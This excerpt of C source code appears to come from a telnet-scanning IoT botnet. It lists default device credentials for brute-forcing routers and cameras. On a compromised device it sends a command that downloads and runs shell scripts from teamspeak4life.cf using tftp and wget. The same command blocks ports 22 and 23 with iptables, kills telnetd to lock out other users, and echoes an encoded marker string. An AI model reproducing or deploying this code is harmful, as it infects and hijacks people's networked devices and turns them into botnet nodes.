...
char *usernames[] = {"root\0", "\0", "admin\0", "user\0", "login\0", "guest\0", "support\0", "cisco\0", "netgear\0", "dreambox\0", "\0", "D-Link\0"};
char *passwords[] = {"root\0", "\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "support\0", "cisco\0", "netgear\0", "dreambox\0", "\0", "123456789\0", "vizxv\0", "D-Link\0"};
...
void StartTheLelz()
{
	...
	while(1)
	{
		for(i = 0; i < max; i++)
		{
			...
			case 8:
				{
					if(send(fds[i].fd, "cd /tmp || cd /mnt || cd /var/run;busybox tftp teamspeak4life.cf -c get tftp.sh;sh tftp.sh;busybox tftp -r tftp1.sh -g teamspeak4life.cf; sh tftp1.sh;busybox wget http://teamspeak4life.cf/gtop.sh; sh gtop.sh;iptables -A INPUT -p tcp --dport 23 -j DROP;iptables -A INPUT -p tcp --dport 22 -j DROP;/sbin/iptables -A INPUT -p tcp --dport 23 -j DROP;/sbin/iptables -A INPUT -p tcp --dport 23 -j DROP;kill -9 $(pidof telnetd);echo -e '\x62\x69\x6e\x66\x61\x67\x74'\r\n", 461, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 9;
				}
				break;
